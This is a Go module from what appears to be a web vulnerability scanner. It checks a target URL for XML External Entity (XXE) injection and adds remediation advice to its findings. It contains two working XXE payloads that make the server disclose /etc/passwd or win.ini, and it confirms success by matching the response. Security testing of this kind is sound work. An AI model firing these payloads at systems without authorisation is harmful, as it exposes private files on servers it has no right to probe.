package modules

import (
	"nightfalllx/pkg/client"
	"regexp"
)

type XXEModule struct{}

func NewXXEModule() *XXEModule {
	return &XXEModule{}
}

func (m *XXEModule) Name() string {
	return "xxe"
}

func (m *XXEModule) Description() string {
	return "XML External Entity (XXE) Injection & File Disclosure"
}

var (
	xxePasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
	xxeWinRegex    = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
)

func (m *XXEModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding

	xxePayloads := []struct {
		Name    string
		Payload string
		Regex   *regexp.Regexp
	}{
		{
			Name: "Linux /etc/passwd XXE",
			Payload: `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
				`<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` + "\n" +
				`<nflx><data>&xxe;</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Windows win.ini XXE",
			Payload: `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
				`<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>` + "\n" +
				`<nflx><data>&xxe;</data></nflx>`,
			Regex: xxeWinRegex,
		},
	}

	xmlHeaders := map[string]string{
		"Content-Type": "application/xml",
		"Accept":       "application/xml, text/xml, */*",
	}

	for _, item := range xxePayloads {
		resp, err := c.Request("POST", target.URL, item.Payload, xmlHeaders)
		if err != nil || resp == nil || resp.Body == "" {
			continue
		}

		if item.Regex.MatchString(resp.Body) {
			evidence := resp.Body
			if len(evidence) > 200 {
				evidence = evidence[:200]
			}
			findings = append(findings, &Finding{
				Module:      m.Name(),
				Title:       "XML External Entity (XXE) Injection",
				Severity:    SeverityCritical,
				Confidence:  100,
				URL:         target.URL,
				Parameter:   "(XML Body)",
				Payload:     item.Name,
				Detail:      "Arbitrary local file disclosure confirmed via XML External Entity (XXE) injection.",
				Evidence:    evidence,
				Remediation: "Disable DTD processing and external entity resolution in all XML parsers (e.g. setFeature disallow-doctype-decl).",
				CWEID:       611,
			})
			break
		}
	}

	return findings, nil
}
